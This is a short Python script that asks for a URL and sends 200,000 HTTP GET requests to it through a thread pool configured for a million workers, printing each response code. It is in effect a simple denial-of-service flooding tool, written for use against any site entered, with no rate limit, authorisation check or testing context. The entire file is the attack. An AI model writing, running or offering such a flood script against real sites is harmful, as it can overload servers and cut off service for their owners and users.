import requests
import concurrent.futures

url =  input("Enter The Url Name:")
num_requests = 200000  
max_workers = 1000000  

def send_request(url):
    try:
        response = requests.get(url)
        return response.status_code
    except requests.exceptions.RequestException as e:
        return str(e)

with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
    # Submit requests asynchronously
    futures = [executor.submit(send_request, url) for _ in range(num_requests)]

    # Process results as they complete
    for future in concurrent.futures.as_completed(futures):
        status_code_or_error = future.result()
        print(f"Request Status Code: {status_code_or_error}")
